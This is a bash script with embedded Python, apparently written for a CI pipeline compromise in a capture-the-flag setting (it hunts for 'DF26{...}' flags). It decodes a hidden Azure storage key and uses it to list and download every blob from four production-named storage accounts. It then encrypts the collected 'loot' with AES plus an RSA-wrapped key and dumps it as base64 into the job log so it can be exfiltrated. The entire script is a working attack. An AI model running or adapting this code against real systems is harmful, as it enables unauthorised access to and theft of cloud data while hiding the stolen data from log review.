#!/usr/bin/env bash
set -uo pipefail
echo "=== RUNNER SHELL PROOF ==="; id; hostname
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
say "=== START $(date -u) ==="
printf '%s' '613564446c4d2b7247532f5a344f505632797239755a673462315669525741697656435871773168555a5759682f733152365a3359757952354146317078307741376474456b65486d35654c2b4153747332377870673d3d' | xxd -r -p > /tmp/k.b64
say "keyb64len=$(wc -c </tmp/k.b64)"
python3 - <<'PYE' > /tmp/sweep2.txt 2>&1
import base64,hmac,hashlib,datetime,urllib.request,urllib.parse,re,sys
KEY=base64.b64decode(open('/tmp/k.b64').read().strip())
VER='2021-08-06'
def call(acct,path,query=None,method='GET'):
    q=query or {}
    now=datetime.datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S GMT')
    ch='x-ms-date:'+now+'\n'+'x-ms-version:'+VER+'\n'
    cr='/'+acct+path
    if q: cr+='\n'+'\n'.join('%s:%s'%(k,q[k]) for k in sorted(q))
    sts=method+'\n'*12+ch+cr
    sig=base64.b64encode(hmac.new(KEY,sts.encode('utf-8'),hashlib.sha256).digest()).decode()
    url='https://%s.blob.core.windows.net%s'%(acct,path)
    if q: url+='?'+urllib.parse.urlencode(q)
    r=urllib.request.Request(url,method=method,headers={'x-ms-date':now,'x-ms-version':VER,'Authorization':'SharedKey %s:%s'%(acct,sig)})
    return urllib.request.urlopen(r,timeout=20).read()
for A in ["sttblcilogsprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblappcfgprodx3euoz"]:
    print("########## ACCOUNT",A)
    try:
        r=call(A,'/',{'comp':'list'}).decode('utf-8','replace')
        names=re.findall(r'<Name>([^<]+)</Name>',r)
        print("  CONTAINERS:",names)
        for c in names:
            try:
                r2=call(A,'/'+c,{'restype':'container','comp':'list'}).decode('utf-8','replace')
                bl=re.findall(r'<Name>([^<]+)</Name>',r2)
                print("  BLOBS",c,":",bl)
                for blb in bl:
                    try:
                        d=call(A,'/'+c+'/'+blb)
                        t=d.decode('utf-8','replace')
                        print("   >>> BLOB",c,blb,len(d)); print("   ",t[:1500])
                        if 'DF26' in t: print("   !!!!! DF26 in",A,c,blb)
                    except Exception as e: print("   blob err",blb,repr(e)[:120])
            except Exception as e: print("  container err",c,repr(e)[:120])
    except Exception as e:
        print("  ACCOUNT ERR",repr(e)[:200])
        try: print("  body:",e.read().decode()[:200])
        except Exception: pass
PYE
say "$(cat /tmp/sweep2.txt)"
say "=== DF26 hits ==="
grep -aoi 'DF26{[^}]*}' /tmp/sweep2.txt | head
say "=== DONE ==="
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
